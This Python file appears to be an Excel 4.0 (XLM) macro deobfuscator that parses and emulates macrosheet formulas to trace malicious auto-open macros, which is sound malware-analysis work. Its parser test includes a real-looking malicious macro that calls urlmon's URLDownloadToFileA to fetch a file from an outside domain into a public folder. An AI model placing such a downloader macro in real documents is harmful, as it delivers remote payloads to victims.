import argparse

from win32com.client import Dispatch
import re
import os
from lark import Lark
from lark.reconstruct import Reconstructor
from lark.lexer import Token
from excel_wrapper import ExcelWrapper
from xlsm_wrapper import XLSMWrapper
from enum import Enum
import time
import datetime
import copy
from boundsheet import *


class EvalStatus(Enum):
    FullEvaluation = 1
    PartialEvaluation = 2
    Error = 3
    NotImplemented = 4
    End = 5



class XLMInterpreter:
    def __init__(self, xlm_wrapper):
        self.xlm_wrapper = xlm_wrapper
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
        self.xlm_parser = Lark(macro_grammar, parser='lalr')
        self.defined_names = self.xlm_wrapper.get_defined_names()
        self.tree_reconstructor = Reconstructor(self.xlm_parser)

    def is_float(self, text):
        try:
            float(text)
            return True
        except ValueError:
            return False

    def is_int(self, text):
        try:
            int(text)
            return True
        except ValueError:
            return False
        except TypeError:
            return False

    def get_formula_cell(self, macrosheet, col, row):
        result_cell = None
        not_found = False
        row = int(row)
        current_row = row
        current_addr = col + str(current_row)
        while current_addr not in macrosheet.cells or \
                macrosheet.cells[current_addr].formula is None:
            if (current_row - row) < 50:
                current_row += 1
            else:
                not_found = True
                break
            current_addr = col + str(current_row)

        if not_found is False:
            result_cell = macrosheet.cells[current_addr]

        return result_cell

    def get_argument_length(self, arglist_node):
        result = None
        if arglist_node.data == 'arglist':
            result = len(arglist_node.children)
        return result

    def get_cell(self, current_cell, cell_parse_tree):
        res_sheet = res_col = res_row = None
        if type(cell_parse_tree) is Token:
            names = self.xlm_wrapper.get_defined_names()
            label = cell_parse_tree.value
            if label in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[cell_parse_tree])
        else:
            cell = cell_parse_tree.children[0]
            if cell.data == 'absolute_cell':
                res_sheet, res_col, res_row = Cell.parse_cell_addr(cell.children[0])
                if res_sheet is None:
                    res_sheet = current_cell.sheet.name
            elif cell.data == 'relative_cell':
                first_child = cell.children[0]
                second_child = cell.children[1]
                res_sheet = current_cell.sheet.name
                res_col = Cell.convert_to_column_index(current_cell.column)
                res_row = int(current_cell.row)
                if first_child == 'R' and self.is_int(second_child):
                    res_row = res_row + int(second_child)
                    if len(cell.children) == 4:
                        res_col = res_col + int(cell.children[4])
                elif second_child == 'c':
                    res_col = res_col + int(cell.children[2])

                res_row = str(res_row)
                res_col = Cell.convert_to_column_name(res_col)
            else:
                raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def set_cell(self, sheet_name, col, row, text):
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr not in sheet.cells:
                new_cell = Cell()
                new_cell.column = col
                new_cell.row = row
                new_cell.sheet = sheet
                sheet.cells[addr] = new_cell

            cell = sheet.cells[addr]
            if text.startswith('='):
                cell.formula = text
            else:
                cell.value = text

    def evaluate_parse_tree(self, current_cell, parse_tree_root):
        next_cell = None
        status = EvalStatus.NotImplemented
        text = None
        return_val = None

        if type(parse_tree_root) is Token:
            text = parse_tree_root.value
            status = EvalStatus.FullEvaluation
            return_val = text
        elif parse_tree_root.data == 'function_call':
            function_name = parse_tree_root.children[0]
            function_arguments = parse_tree_root.children[1]
            size = self.get_argument_length(function_arguments)

            if function_name == 'RUN':
                if size == 1:
                    next_sheet, next_col, next_row = self.get_cell(current_cell,
                                                                   function_arguments.children[0].children[0])
                    if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                        next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                          next_col,
                                                          next_row)
                        text = 'RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                        status = EvalStatus.FullEvaluation
                    else:
                        status = EvalStatus.Error
                        text = self.tree_reconstructor.reconstruct(parse_tree_root)
                    return_val = 0
                elif size == 2:
                    text = 'RUN(reference, step)'
                    status = EvalStatus.NotImplemented
                else:
                    text = 'RUN() is incorrect'
                    status = EvalStatus.Error


            elif function_name == 'CHAR':
                next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell,
                                                                               function_arguments.children[0])
                if status == EvalStatus.FullEvaluation:
                    text = chr(int(text))
                    cell = self.get_formula_cell(current_cell.sheet, current_cell.column, current_cell.row)
                    cell.value = text
                    return_val = text

            elif function_name == 'FORMULA':
                first_arg = function_arguments.children[0]
                next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, first_arg)
                second_arg = function_arguments.children[1].children[0]
                dst_sheet, dst_col, dst_row = self.get_cell(current_cell, second_arg)
                if status == EvalStatus.FullEvaluation:
                    self.set_cell(dst_sheet, dst_col, dst_row, text)
                text = "FORMULA({},{})".format(text, '{}!{}{}'.format(dst_sheet, dst_col, dst_row))
                return_val = 0

            elif function_name == 'CALL':
                arguments = []
                status = EvalStatus.FullEvaluation
                for argument in function_arguments.children:
                    next_cell, tmp_status, return_val, text = self.evaluate_parse_tree(current_cell, argument)
                    if tmp_status == EvalStatus.FullEvaluation:
                        if text is not None:
                            arguments.append(text)
                        else:
                            arguments.append(' ')
                    else:
                        status = tmp_status
                        arguments.append('not evaluated')
                text = 'CALL({})'.format(','.join(arguments))
                return_val = 0

            elif function_name in ('HALT', 'CLOSE'):
                next_row = None
                next_col = None
                next_sheet = None
                text = self.tree_reconstructor.reconstruct(parse_tree_root)
                status = EvalStatus.End

            elif function_name == 'GOTO':
                next_sheet, next_col, next_row = self.get_cell(current_cell, function_arguments.children[0].children[0])
                if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                    next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                      next_col,
                                                      next_row)
                    status = EvalStatus.FullEvaluation
                else:
                    status = EvalStatus.Error
                text = self.tree_reconstructor.reconstruct(parse_tree_root)

            elif function_name.lower() in self.defined_names:
                cell_text = self.defined_names[function_name.lower()]
                next_sheet, next_col, next_row = self.parse_cell_address(cell_text)
                text = 'Label ' + function_name
                status = EvalStatus.FullEvaluation

            elif function_name == 'ERROR':
                text = 'ERROR'
                status = EvalStatus.FullEvaluation

            elif function_name == 'IF':
                if size == 3:
                    second_arg = function_arguments.children[1]
                    next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, second_arg)
                    if status == EvalStatus.FullEvaluation:
                        third_arg = function_arguments.children[2]
                    status = EvalStatus.PartialEvaluation
                else:
                    status = EvalStatus.FullEvaluation
                text = self.tree_reconstructor.reconstruct(parse_tree_root)

            elif function_name == 'NOW':
                text = datetime.datetime.now()
                status = EvalStatus.FullEvaluation

            elif function_name == 'DAY':
                first_arg = function_arguments.children[0]
                next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, first_arg)
                if status == EvalStatus.FullEvaluation:
                    if type(text) is datetime.datetime:
                        text = str(text.day)
                        status = EvalStatus.FullEvaluation
                    elif self.is_float(text):
                        text = 'DAY(Serial Date)'
                        status = EvalStatus.NotImplemented

            else:
                # args_str =''
                # for argument in function_arguments.children:
                #     next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, argument)
                #     args_str += str(return_val) +','
                # args_str.strip(',')
                # text = '{}({})'.format(function_name, args_str)
                text = self.tree_reconstructor.reconstruct(parse_tree_root)
                status = EvalStatus.NotImplemented

        elif parse_tree_root.data == 'method_call':
            text = self.tree_reconstructor.reconstruct(parse_tree_root)
            status = EvalStatus.NotImplemented

        elif parse_tree_root.data == 'cell':
            sheet_name, col, row = self.get_cell(current_cell, parse_tree_root)
            cell_addr = col + str(row)
            sheet = self.xlm_wrapper.get_macrosheets()[sheet_name]
            missing = True
            if cell_addr in sheet.cells:
                cell = sheet.cells[cell_addr]
                if cell.value is not None:
                    text = cell.value
                    status = EvalStatus.FullEvaluation
                    missing = False
                else:
                    text = "{}".format( cell_addr)
                    print('\nProcess Interruption:')
                    print('CELL:{:10}{}'.format(current_cell.get_local_address(), current_cell.formula))
                    print('CELL:{:10}formula: {}'.format(text, cell.formula))
                    print('{} is not populated, what should be its value (don\'t know? (enter))'.format(text))


            else:
                text = "{}".format(cell_addr)
                print('\nProcess Interruption:')
                print('CELL:{:10}{}'.format(current_cell.get_local_address(), current_cell.formula))
                print('{} is not populated, what should be its value (don\'t know? (enter))'.format(text))


            if missing:
                result = input()
                result = result.strip()
                if result:
                    text = result
                    self.set_cell(sheet_name, col, row, text)
                    status = EvalStatus.FullEvaluation
                else:
                    status = EvalStatus.PartialEvaluation

        elif parse_tree_root.data == 'binary_expression':
            left_arg = parse_tree_root.children[0]
            next_cell, l_status, return_val, text_left = self.evaluate_parse_tree(current_cell, left_arg)
            operator = str(parse_tree_root.children[1].children[0])
            right_arg = parse_tree_root.children[2]
            next_cell, r_status, return_val, text_right = self.evaluate_parse_tree(current_cell, right_arg)
            if l_status == EvalStatus.FullEvaluation and r_status == EvalStatus.FullEvaluation:
                status = EvalStatus.FullEvaluation
                if operator == '&':
                    text = text_left + text_right
                elif self.is_int(text_left) and self.is_int(text_right):
                    if operator == '-':
                        text = str(int(text_left) - int(text_right))
                    elif operator == '+':
                        text = str(int(text_left) + int(text_right))
                    elif operator == '*':
                        text = str(int(text_left) * int(text_right))
                    else:
                        text = 'Operator ' + operator
                        status = EvalStatus.NotImplemented
                else:
                    text = self.tree_reconstructor.reconstruct(parse_tree_root)
                    status = EvalStatus.PartialEvaluation
            else:
                status = EvalStatus.PartialEvaluation
                text = '{}{}{}'.format(text_left, operator, text_right)
            return_val = text
        else:
            status = EvalStatus.FullEvaluation
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    next_cell, tmp_status, return_val, text = self.evaluate_parse_tree(current_cell, child_node)
                    if tmp_status != EvalStatus.FullEvaluation:
                        status = tmp_status

        return next_cell, status, return_val, text

    def deobfuscate_macro(self):
        result = []

        auto_open_labels = self.xlm_wrapper.get_defined_name('_xlnm.auto_open', full_match=False)
        for auto_open_label in auto_open_labels:
            sheet_name, col, row = Cell.parse_cell_addr(auto_open_label[1])
            macros = self.xlm_wrapper.get_macrosheets()
            current_cell = self.get_formula_cell(macros[sheet_name], col, row)
            self.branches = []
            while current_cell is not None:
                parse_tree = self.xlm_parser.parse(current_cell.formula)
                next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, parse_tree)
                if return_val is not None:
                    current_cell.value = str(return_val)
                if next_cell is None and status != EvalStatus.Error:
                    next_cell = self.get_formula_cell(current_cell.sheet,
                                                      current_cell.column,
                                                      str(int(current_cell.row) + 1))
                yield (current_cell, status, text)
                if next_cell is not None:
                    current_cell = next_cell
                else:
                    break


def test_parser():
    macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar, parser='lalr')

    print("\n=171*GET.CELL(19,A81)")
    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


if __name__ == '__main__':

    # path = r"C:\Users\user\Downloads\xlsmtest.xlsm"
    # 01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606
    # 63bacd873beeca6692142df432520614a1641ea395adaabc705152c55ab8c1d7
    # b5cd024106fa2e571b8050915bcf85a95882ee54173a7a8020bfe69d1dea39c7
    # 4dcee9176ca1241b6a25182f778db235a23a65b86161d0319318c4923c3dc6e6

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-f", "--file", type=str, help="The path of a XLSM file")
    args = arg_parser.parse_known_args()
    if args[0].file is not None:
        file_path = args[0].file

        start = time.time()
        xlsm_doc = XLSMWrapper(file_path)
        interpreter = XLMInterpreter(xlsm_doc)

        for step in interpreter.deobfuscate_macro():
            print('CELL:{:10}{:20}{}'.format(step[0].get_local_address(), step[1].name, step[2]))

        end = time.time()
        print('time elapsed: ' + str(end - start))
    else:
        arg_parser.print_help()
